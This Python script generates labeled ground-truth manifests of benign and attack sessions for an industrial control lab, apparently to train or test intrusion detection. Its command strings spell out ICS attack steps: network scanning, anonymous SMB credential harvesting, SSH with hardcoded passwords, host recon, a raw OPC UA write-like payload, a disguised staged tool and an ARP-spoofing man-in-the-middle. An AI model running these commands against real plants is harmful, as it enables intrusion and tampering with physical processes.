from __future__ import annotations

import json
import time
from pathlib import Path


ROOT_DIR = Path(__file__).resolve().parents[1]
ARTIFACT_ROOT = ROOT_DIR / "artifacts" / "scenario-runs"
STAMP = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())


def step(
    scenario_step: str,
    attack_label: str,
    attack_stage: str,
    asset_class: str,
    mitre_technique: str,
    source_asset: str,
    target_asset: str,
    event_kind: str,
    command: str,
    duration_sec: float = 1.2,
):
    return {
        "scenario_step": scenario_step,
        "attack_label": attack_label,
        "attack_stage": attack_stage,
        "asset_class": asset_class,
        "mitre_technique": mitre_technique,
        "source_asset": source_asset,
        "target_asset": target_asset,
        "event_kind": event_kind,
        "command": command,
        "duration_sec": duration_sec,
    }


def historian_login_cmd() -> str:
    return "curl -s -c ./historian.cookie -b ./historian.cookie -d 'username=john&password=Cisco' -X POST http://192.168.1.10:5000/login"


def historian_overview_cmd() -> str:
    return "curl -s -b ./historian.cookie http://192.168.1.10:5000/portal/overview"


def historian_history_cmd(tag: str) -> str:
    return f"curl -s -b ./historian.cookie 'http://192.168.1.10:5000/portal/history?tag={tag}'"


def historian_api_latest_cmd() -> str:
    return "curl -s http://192.168.1.10:5000/api/grafana/latest"


def historian_api_history_cmd(tag: str) -> str:
    return f"curl -s 'http://192.168.1.10:5000/history?tag={tag}'"


def ews_access_cmd() -> str:
    return "sshpass -p 'Cisco' ssh john@192.168.1.5 \"hostname && whoami\""


def ews_status_cmd() -> str:
    return "sshpass -p 'Cisco' ssh john@192.168.1.5 \"powershell -NoProfile -Command \\\"Get-Date; Get-Service sshd | Select-Object Status,Name\\\"\""


def ews_historian_cmd(tag: str) -> str:
    return f"sshpass -p 'Cisco' ssh john@192.168.1.5 \"cmd /c curl.exe -s http://192.168.1.10:5000/portal/history?tag={tag}\""


def ews_tags_cmd() -> str:
    return "sshpass -p 'Cisco' ssh john@192.168.1.5 \"cmd /c curl.exe -s http://192.168.1.10:5000/tags\""


def ews_smb_cmd() -> str:
    return "sshpass -p 'Cisco' ssh john@192.168.1.5 \"powershell -NoProfile -Command \\\"Get-Content '\\\\\\\\192.168.1.7\\\\Operations\\\\ews_maintenance_access.txt'\\\"\""


def ews_recon_cmd() -> str:
    return "sshpass -p 'Cisco' ssh john@192.168.1.5 \"powershell -NoProfile -Command \\\"whoami; hostname; Get-NetIPAddress | Select-Object -First 4 IPAddress,InterfaceAlias; Get-SmbMapping; Get-Process | Select-Object -First 3 Name,Id\\\"\""


def opcua_probe_cmd() -> str:
    return "python3 -c \"import socket; s = socket.create_connection(('192.168.1.11', 4840), timeout=3); print('opcua tcp probe ok'); s.close()\""


def critical_probe_cmd() -> str:
    return "python3 -c \"import socket; payload = b'MSGF' + b'\\x01\\xa1\\x02' + b'line1_vibration_mm_s'; s = socket.create_connection(('192.168.1.11', 4840), timeout=3); s.sendall(payload); s.close(); print('critical opcua write-like probe sent')\""


def scan_cmd() -> str:
    return "nmap -Pn -T4 -p 22,445,5000,4840 192.168.1.5 192.168.1.7 192.168.1.10 192.168.1.11"


def smb_browse_cmd() -> str:
    return "smbclient //192.168.1.7/Operations -N -m SMB3 -c 'ls; get ews_maintenance_access.txt ./ews_maintenance_access.txt'"


def failed_login_cmd(username: str, password: str) -> str:
    return f"curl -s -o /dev/null -w '%{{http_code}}\\n' -d 'username={username}&password={password}' -X POST http://192.168.1.10:5000/login"


def failed_ews_login_cmd(password: str) -> str:
    return f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null john@192.168.1.5 \"hostname && whoami\""


def staged_tool_cmd() -> str:
    return "sshpass -p 'Cisco' ssh john@192.168.1.5 \"powershell -NoProfile -Command \\\"& py -3.11 C:\\\\Users\\\\john\\\\AppData\\\\Local\\\\Microsoft\\\\Diagnosis\\\\Downloads\\\\telemetry_sync_cache.py --endpoint opc.tcp://192.168.1.11:4840 --cycles 2 --pause 0.2\\\"\""


def arp_mitm_cmd() -> str:
    # Poison historian (192.168.1.10) so it resolves OPC-UA IP (192.168.1.11)
    # to the attacker's MAC, intercepting the OPC UA path (T0830).
    return (
        "sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward; "
        "arpspoof -i eth0 -t 192.168.1.10 192.168.1.11 & "
        "arpspoof -i eth0 -t 192.168.1.11 192.168.1.10 & "
        "sleep 8; kill $(jobs -p)'"
    )


SESSIONS = [
    {
        "id": "curated-benign-overview-a",
        "family": "benign_historian_overview",
        "ground_truth_label": "benign",
        "session_intent": "operator_review",
        "session_danger_label": "low",
        "session_summary": "Authorized operator reviewed historian overview and process history for air pressure.",
        "steps": [
            step("historian_login", "authorized_access", "benign_access", "historian", "T0000", "monitoring_laptop", "historian", "http_request", historian_login_cmd()),
            step("historian_overview", "monitoring", "benign_historian_review", "historian", "T0000", "monitoring_laptop", "historian", "http_request", historian_overview_cmd()),
            step("historian_history_query", "monitoring", "benign_historian_review", "historian", "T0000", "monitoring_laptop", "historian", "http_request", historian_history_cmd("air_pressure_bar")),
        ],
    },
    {
        "id": "curated-benign-overview-b",
        "family": "benign_historian_overview",
        "ground_truth_label": "benign",
        "session_intent": "operator_review",
        "session_danger_label": "low",
        "session_summary": "Authorized operator reviewed historian history for cooling water temperature.",
        "steps": [
            step("historian_login", "authorized_access", "benign_access", "historian", "T0000", "monitoring_laptop", "historian", "http_request", historian_login_cmd()),
            step("historian_overview", "monitoring", "benign_historian_review", "historian", "T0000", "monitoring_laptop", "historian", "http_request", historian_overview_cmd()),
            step("historian_history_query", "monitoring", "benign_historian_review", "historian", "T0000", "monitoring_laptop", "historian", "http_request", historian_history_cmd("cooling_water_temp_c")),
        ],
    },
    {
        "id": "curated-benign-api-a",
        "family": "benign_api_review",
        "ground_truth_label": "benign",
        "session_intent": "process_monitoring",
        "session_danger_label": "low",
        "session_summary": "Monitoring workstation reviewed historian API outputs for vibration.",
        "steps": [
            step("historian_api_latest", "monitoring", "monitoring_api", "historian", "T0000", "monitoring_laptop", "historian", "http_request", historian_api_latest_cmd()),
            step("historian_api_history", "monitoring", "monitoring_api", "historian", "T0000", "monitoring_laptop", "historian", "http_request", historian_api_history_cmd("line1_vibration_mm_s")),
        ],
    },
    {
        "id": "curated-benign-api-b",
        "family": "benign_api_review",
        "ground_truth_label": "benign",
        "session_intent": "process_monitoring",
        "session_danger_label": "low",
        "session_summary": "Monitoring workstation reviewed historian API outputs for welding temperature.",
        "steps": [
            step("historian_api_latest", "monitoring", "monitoring_api", "historian", "T0000", "monitoring_laptop", "historian", "http_request", historian_api_latest_cmd()),
            step("historian_api_history", "monitoring", "monitoring_api", "historian", "T0000", "monitoring_laptop", "historian", "http_request", historian_api_history_cmd("weld_cell_temperature_c")),
        ],
    },
    {
        "id": "curated-benign-ews-maint-a",
        "family": "benign_ews_maintenance",
        "ground_truth_label": "benign",
        "session_intent": "maintenance_check",
        "session_danger_label": "low",
        "session_summary": "Authorized maintenance session checked EWS status and reviewed historian tags.",
        "steps": [
            step("ews_ssh_access", "authorized_access", "benign_access", "ews", "T0000", "monitoring_laptop", "ews", "ssh_session", ews_access_cmd()),
            step("ews_service_status", "maintenance", "benign_host_check", "ews", "T0000", "ews", "ews", "process_launch", ews_status_cmd()),
            step("ews_historian_tag_review", "monitoring", "benign_historian_review", "historian", "T0000", "ews", "historian", "http_request", ews_tags_cmd()),
        ],
    },
    {
        "id": "curated-benign-ews-file-a",
        "family": "benign_ews_file_review",
        "ground_truth_label": "benign",
        "session_intent": "maintenance_check",
        "session_danger_label": "low",
        "session_summary": "Authorized EWS user reviewed a maintenance document from the SMB share.",
        "steps": [
            step("ews_ssh_access", "authorized_access", "benign_access", "ews", "T0000", "monitoring_laptop", "ews", "ssh_session", ews_access_cmd()),
            step("ews_smb_document_review", "maintenance", "benign_smb_review", "smb", "T0000", "ews", "smb", "smb_read", ews_smb_cmd()),
        ],
    },
    {
        "id": "curated-benign-opcua-a",
        "family": "benign_opcua_healthcheck",
        "ground_truth_label": "benign",
        "session_intent": "ot_healthcheck",
        "session_danger_label": "low",
        "session_summary": "Routine OT healthcheck validated OPC UA TCP reachability and historian API output.",
        "steps": [
            step("opcua_tcp_healthcheck", "monitoring", "network_healthcheck", "opcua", "T0000", "monitoring_laptop", "opcua", "tcp_probe", opcua_probe_cmd()),
            step("historian_api_latest", "monitoring", "monitoring_api", "historian", "T0000", "monitoring_laptop", "historian", "http_request", historian_api_latest_cmd()),
        ],
    },
    {
        "id": "curated-attack-discovery-a",
        "family": "discovery_scan",
        "ground_truth_label": "attack",
        "session_intent": "discovery_scan",
        "session_danger_label": "medium",
        "session_summary": "Rapid service discovery scan against the Level 3 and OT services.",
        "steps": [
            step("level3_service_scan", "discovery", "discovery", "network", "T0846", "monitoring_laptop", "level3_network", "network_scan", scan_cmd(), 2.0),
        ],
    },
    {
        "id": "curated-attack-hist-failed-a",
        "family": "historian_failed_login",
        "ground_truth_label": "attack",
        "session_intent": "credential_access",
        "session_danger_label": "medium",
        "session_summary": "Credential validation attempt against the historian with invalid passwords.",
        "steps": [
            step("historian_failed_login_a", "credential_access", "credential_access", "historian", "T0812", "monitoring_laptop", "historian", "http_request", failed_login_cmd("john", "WrongPass1!")),
            step("historian_failed_login_b", "credential_access", "credential_access", "historian", "T0812", "monitoring_laptop", "historian", "http_request", failed_login_cmd("operator", "Cisco")),
        ],
    },
    {
        "id": "curated-attack-ews-login-only-a",
        "family": "ews_access_validation",
        "ground_truth_label": "attack",
        "session_intent": "credential_reuse",
        "session_danger_label": "medium",
        "session_summary": "Recovered credentials were used to validate direct SSH access to EWS, but the session stopped before follow-on actions.",
        "steps": [
            step("ews_ssh_access", "lateral_movement", "host_activity", "ews", "T0866", "monitoring_laptop", "ews", "ssh_session", ews_access_cmd()),
        ],
    },
    {
        "id": "curated-attack-smb-browse-only-a",
        "family": "anonymous_smb_browse",
        "ground_truth_label": "attack",
        "session_intent": "credential_access",
        "session_danger_label": "medium",
        "session_summary": "Anonymous browsing of the SMB share exposed maintenance files, but the session ended before host access.",
        "steps": [
            step("anonymous_smb_browse", "credential_access", "smb_access", "smb", "T0811", "monitoring_laptop", "smb", "smb_read", smb_browse_cmd()),
        ],
    },
    {
        "id": "curated-attack-host-recon-b",
        "family": "host_recon_light",
        "ground_truth_label": "attack",
        "session_intent": "host_recon",
        "session_danger_label": "medium",
        "session_summary": "A compromised EWS session ran lightweight reconnaissance commands without moving into OT impact activity.",
        "steps": [
            step("ews_ssh_access", "lateral_movement", "host_activity", "ews", "T0866", "monitoring_laptop", "ews", "ssh_session", ews_access_cmd()),
            step("ews_recon_commands", "recon", "host_command", "ews", "T0842", "ews", "ews", "process_launch", "sshpass -p 'Cisco' ssh john@192.168.1.5 \"powershell -NoProfile -Command \\\"whoami; hostname; Get-Date\\\"\""),
        ],
    },
    {
        "id": "curated-attack-hist-login-only-a",
        "family": "historian_access_validation",
        "ground_truth_label": "attack",
        "session_intent": "credential_access",
        "session_danger_label": "medium",
        "session_summary": "Valid reused credentials were tested against the historian login portal without any follow-on collection.",
        "steps": [
            step("historian_login", "credential_access", "credential_access", "historian", "T0812", "monitoring_laptop", "historian", "http_request", historian_login_cmd()),
        ],
    },
    {
        "id": "curated-attack-ews-failed-a",
        "family": "ews_failed_login",
        "ground_truth_label": "attack",
        "session_intent": "credential_access",
        "session_danger_label": "medium",
        "session_summary": "An invalid password was tried against EWS SSH before the operator abandoned the session.",
        "steps": [
            step("ews_failed_login", "credential_access", "credential_access", "ews", "T0812", "monitoring_laptop", "ews", "ssh_session", failed_ews_login_cmd("WrongPass1!")),
        ],
    },
    {
        "id": "curated-attack-creds-a",
        "family": "credential_reuse_chain",
        "ground_truth_label": "attack",
        "session_intent": "credential_reuse",
        "session_danger_label": "medium",
        "session_summary": "Anonymous SMB access exposed credentials that were then reused against EWS.",
        "steps": [
            step("anonymous_smb_browse", "credential_access", "smb_access", "smb", "T0811", "monitoring_laptop", "smb", "smb_read", smb_browse_cmd()),
            step("ews_ssh_access", "lateral_movement", "host_activity", "ews", "T0866", "monitoring_laptop", "ews", "ssh_session", ews_access_cmd()),
        ],
    },
    {
        "id": "curated-attack-host-recon-a",
        "family": "host_recon",
        "ground_truth_label": "attack",
        "session_intent": "host_recon",
        "session_danger_label": "high",
        "session_summary": "Compromised EWS session executed host reconnaissance commands.",
        "steps": [
            step("ews_ssh_access", "lateral_movement", "host_activity", "ews", "T0866", "monitoring_laptop", "ews", "ssh_session", ews_access_cmd()),
            step("ews_recon_commands", "recon", "host_command", "ews", "T0842", "ews", "ews", "process_launch", ews_recon_cmd()),
        ],
    },
    {
        "id": "curated-attack-hist-collect-a",
        "family": "historian_collection",
        "ground_truth_label": "attack",
        "session_intent": "collection",
        "session_danger_label": "high",
        "session_summary": "Compromised EWS session queried historian history for vibration data.",
        "steps": [
            step("ews_ssh_access", "lateral_movement", "host_activity", "ews", "T0866", "monitoring_laptop", "ews", "ssh_session", ews_access_cmd()),
            step("ews_historian_history_query", "collection", "historian_web", "historian", "T0802", "ews", "historian", "http_request", ews_historian_cmd("line1_vibration_mm_s")),
        ],
    },
    {
        "id": "curated-attack-hist-collect-b",
        "family": "historian_collection",
        "ground_truth_label": "attack",
        "session_intent": "collection",
        "session_danger_label": "high",
        "session_summary": "Compromised EWS session queried historian history for air pressure data.",
        "steps": [
            step("ews_ssh_access", "lateral_movement", "host_activity", "ews", "T0866", "monitoring_laptop", "ews", "ssh_session", ews_access_cmd()),
            step("ews_historian_history_query", "collection", "historian_web", "historian", "T0802", "ews", "historian", "http_request", ews_historian_cmd("air_pressure_bar")),
        ],
    },
    {
        "id": "curated-attack-smb-collect-a",
        "family": "smb_collection",
        "ground_truth_label": "attack",
        "session_intent": "collection",
        "session_danger_label": "high",
        "session_summary": "Compromised EWS session accessed the SMB share to retrieve maintenance data.",
        "steps": [
            step("ews_ssh_access", "lateral_movement", "host_activity", "ews", "T0866", "monitoring_laptop", "ews", "ssh_session", ews_access_cmd()),
            step("ews_smb_read", "collection", "smb_access", "smb", "T0811", "ews", "smb", "smb_read", ews_smb_cmd()),
        ],
    },
    {
        "id": "curated-attack-opcua-recon-a",
        "family": "opcua_recon",
        "ground_truth_label": "attack",
        "session_intent": "ot_recon",
        "session_danger_label": "high",
        "session_summary": "Compromised session verified TCP reachability toward the OPC UA server.",
        "steps": [
            step("ews_ssh_access", "lateral_movement", "host_activity", "ews", "T0866", "monitoring_laptop", "ews", "ssh_session", ews_access_cmd()),
            step("opcua_tcp_probe", "recon", "opcua_path", "opcua", "T0861", "monitoring_laptop", "opcua", "tcp_probe", opcua_probe_cmd()),
        ],
    },
    {
        "id": "curated-attack-full-chain-a",
        "family": "full_chain_collection",
        "ground_truth_label": "attack",
        "session_intent": "multi_stage_collection",
        "session_danger_label": "high",
        "session_summary": "Credential discovery moved into EWS access, historian review, and OT probing.",
        "steps": [
            step("anonymous_smb_browse", "credential_access", "smb_access", "smb", "T0811", "monitoring_laptop", "smb", "smb_read", smb_browse_cmd()),
            step("ews_ssh_access", "lateral_movement", "host_activity", "ews", "T0866", "monitoring_laptop", "ews", "ssh_session", ews_access_cmd()),
            step("ews_historian_history_query", "collection", "historian_web", "historian", "T0802", "ews", "historian", "http_request", ews_historian_cmd("weld_cell_temperature_c")),
            step("opcua_tcp_probe", "recon", "opcua_path", "opcua", "T0861", "monitoring_laptop", "opcua", "tcp_probe", opcua_probe_cmd()),
        ],
    },
    {
        "id": "curated-attack-full-chain-b",
        "family": "full_chain_collection",
        "ground_truth_label": "attack",
        "session_intent": "multi_stage_collection",
        "session_danger_label": "high",
        "session_summary": "Credential discovery moved into EWS access, historian review, and OT probing for air pressure.",
        "steps": [
            step("anonymous_smb_browse", "credential_access", "smb_access", "smb", "T0811", "monitoring_laptop", "smb", "smb_read", smb_browse_cmd()),
            step("ews_ssh_access", "lateral_movement", "host_activity", "ews", "T0866", "monitoring_laptop", "ews", "ssh_session", ews_access_cmd()),
            step("ews_historian_history_query", "collection", "historian_web", "historian", "T0802", "ews", "historian", "http_request", ews_historian_cmd("air_pressure_bar")),
            step("opcua_tcp_probe", "recon", "opcua_path", "opcua", "T0861", "monitoring_laptop", "opcua", "tcp_probe", opcua_probe_cmd()),
        ],
    },
    {
        "id": "curated-attack-ot-impact-a",
        "family": "critical_ot_probe",
        "ground_truth_label": "attack",
        "session_intent": "ot_impact",
        "session_danger_label": "critical",
        "session_summary": "Historian review was followed by a critical OPC UA write-like probe against a sensitive tag.",
        "steps": [
            step("ews_ssh_access", "lateral_movement", "host_activity", "ews", "T0866", "monitoring_laptop", "ews", "ssh_session", ews_access_cmd()),
            step("ews_historian_history_query", "collection", "historian_web", "historian", "T0802", "ews", "historian", "http_request", ews_historian_cmd("line1_vibration_mm_s")),
            step("opcua_critical_probe", "impact", "opcua_write", "opcua", "T0830", "monitoring_laptop", "opcua", "payload_send", critical_probe_cmd()),
        ],
    },
    {
        "id": "curated-attack-staged-tool-a",
        "family": "staged_tool_impact",
        "ground_truth_label": "attack",
        "session_intent": "ot_impact",
        "session_danger_label": "critical",
        "session_summary": "A staged telemetry manipulation tool executed from EWS before critical OT payload activity.",
        "steps": [
            step("ews_ssh_access", "lateral_movement", "host_activity", "ews", "T0866", "monitoring_laptop", "ews", "ssh_session", ews_access_cmd()),
            step("ews_staged_tool_execution", "impact", "process_anomaly", "ews", "T0831", "ews", "opcua", "process_launch", staged_tool_cmd()),
            step("opcua_critical_probe", "impact", "opcua_write", "opcua", "T0830", "monitoring_laptop", "opcua", "payload_send", critical_probe_cmd()),
        ],
    },
    {
        "id": "curated-attack-full-killchain-arp-a",
        "family": "full_killchain_arp_mitm",
        "ground_truth_label": "attack",
        "session_intent": "ot_impact",
        "session_danger_label": "critical",
        "session_summary": (
            "Complete 8-step ICS kill chain: network discovery, anonymous SMB credential "
            "harvest, EWS lateral movement, host reconnaissance, historian data collection, "
            "OPC UA path probing, staged tool execution, and ARP-poisoning MitM on the "
            "OPC UA historian-to-server path (T0830)."
        ),
        "steps": [
            step("level3_service_scan",       "discovery",         "discovery",      "network",   "T0846", "monitoring_laptop", "level3_network", "network_scan",   scan_cmd(),                                  2.0),
            step("anonymous_smb_browse",      "credential_access", "smb_access",     "smb",       "T0811", "monitoring_laptop", "smb",            "smb_read",       smb_browse_cmd()),
            step("ews_ssh_access",            "lateral_movement",  "host_activity",  "ews",       "T0866", "monitoring_laptop", "ews",            "ssh_session",    ews_access_cmd()),
            step("ews_recon_commands",        "recon",             "host_command",   "ews",       "T0842", "ews",              "ews",            "process_launch", ews_recon_cmd()),
            step("ews_historian_collection",  "collection",        "historian_web",  "historian", "T0802", "ews",              "historian",      "http_request",   ews_historian_cmd("weld_cell_temperature_c")),
            step("opcua_tcp_probe",           "recon",             "opcua_path",     "opcua",     "T0861", "monitoring_laptop", "opcua",          "tcp_probe",      opcua_probe_cmd()),
            step("ews_staged_tool_execution", "impact",            "process_anomaly","ews",       "T0831", "ews",              "opcua",          "process_launch", staged_tool_cmd()),
            step("opcua_arp_mitm",            "impact",            "opcua_write",    "opcua",     "T0830", "monitoring_laptop", "historian_opcua","arp_poison",     arp_mitm_cmd(),                              8.0),
        ],
    },
]


def write_session(index: int, session: dict) -> None:
    scenario_id = f"{session['id']}-{STAMP}"
    out_dir = ARTIFACT_ROOT / scenario_id
    out_dir.mkdir(parents=True, exist_ok=True)
    manifest = out_dir / "ground_truth.jsonl"
    base_ts = time.time() + index * 240
    offset = 0.0

    with manifest.open("w", encoding="utf-8") as fh:
        for step_index, row in enumerate(session["steps"], start=1):
            start_ts = base_ts + offset
            end_ts = start_ts + float(row.get("duration_sec", 1.0))
            offset += float(row.get("duration_sec", 1.0)) + 0.8
            record = {
                "scenario_id": scenario_id,
                "session_id": scenario_id,
                "scenario_family": session["family"],
                "ground_truth_label": session["ground_truth_label"],
                "dataset_split": "ml_curated_labeled",
                "telemetry_origin": "curated_profile",
                "session_intent": session["session_intent"],
                "session_danger_label": session["session_danger_label"],
                "session_summary": session["session_summary"],
                "scenario_step": row["scenario_step"],
                "attack_label": row["attack_label"],
                "attack_stage": row["attack_stage"],
                "asset_class": row["asset_class"],
                "mitre_technique": row["mitre_technique"],
                "source_asset": row["source_asset"],
                "target_asset": row["target_asset"],
                "event_kind": row["event_kind"],
                "start_ts_epoch": round(start_ts, 6),
                "end_ts_epoch": round(end_ts, 6),
                "exit_code": 0,
                "command": row["command"],
                "output_file": str(out_dir / f"step_{step_index}_{row['scenario_step']}.txt"),
            }
            fh.write(json.dumps(record, ensure_ascii=True) + "\n")


def main() -> None:
    ARTIFACT_ROOT.mkdir(parents=True, exist_ok=True)
    for index, session in enumerate(SESSIONS, start=1):
        write_session(index, session)
    print(json.dumps({"generated": len(SESSIONS), "artifact_root": str(ARTIFACT_ROOT), "stamp": STAMP}, indent=2))


if __name__ == "__main__":
    main()
